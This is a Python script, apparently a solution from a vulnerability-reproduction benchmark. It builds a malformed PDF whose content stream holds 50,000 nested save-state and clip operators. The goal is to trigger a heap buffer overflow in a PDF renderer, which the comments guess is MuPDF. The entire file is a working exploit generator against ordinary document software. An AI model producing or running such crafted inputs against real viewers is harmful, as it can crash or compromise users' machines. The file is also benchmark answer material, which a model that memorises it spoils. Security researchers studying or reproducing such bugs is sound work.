import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a heap buffer overflow caused by unchecked nesting depth
        # when pushing a clip mark in the graphics state stack (likely MuPDF or similar).
        # To trigger this, we generate a PDF with a content stream containing deeply 
        # nested 'q' (save state) and 'W' (clip) operators.
        
        # Ground truth length is ~825KB. 
        # A repeating pattern of "q 0 0 1 1 re W n " is 17 bytes.
        # 50,000 iterations * 17 bytes = 850,000 bytes, which aligns with the ground truth.
        iterations = 50000
        payload_chunk = b"q 0 0 1 1 re W n "
        payload = payload_chunk * iterations
        
        out = io.BytesIO()
        
        # Write PDF Header
        out.write(b"%PDF-1.4\n")
        out.write(b"%\xE2\xE3\xCF\xD3\n")
        
        offsets = []
        
        def write_obj(obj_id, content):
            offsets.append(out.tell())
            out.write(f"{obj_id} 0 obj\n".encode())
            out.write(content)
            out.write(b"\nendobj\n")

        # Object 1: Catalog
        write_obj(1, b"<< /Type /Catalog /Pages 2 0 R >>")
        
        # Object 2: Pages
        write_obj(2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")
        
        # Object 3: Page
        write_obj(3, b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>")
        
        # Object 4: Content Stream
        stream_data = b"stream\n" + payload + b"\nendstream"
        # Combine dictionary and stream data
        obj4_content = f"<< /Length {len(payload)} >>\n".encode() + stream_data
        write_obj(4, obj4_content)
        
        # Write Xref Table
        xref_start = out.tell()
        out.write(b"xref\n")
        out.write(f"0 {len(offsets) + 1}\n".encode())
        out.write(b"0000000000 65535 f \n")
        for o in offsets:
            out.write(f"{o:010d} 00000 n \n".encode())
            
        # Write Trailer
        out.write(b"trailer\n")
        out.write(f"<< /Size {len(offsets) + 1} /Root 1 0 R >>\n".encode())
        out.write(b"startxref\n")
        out.write(f"{xref_start}\n".encode())
        out.write(b"%%EOF\n")
        
        return out.getvalue()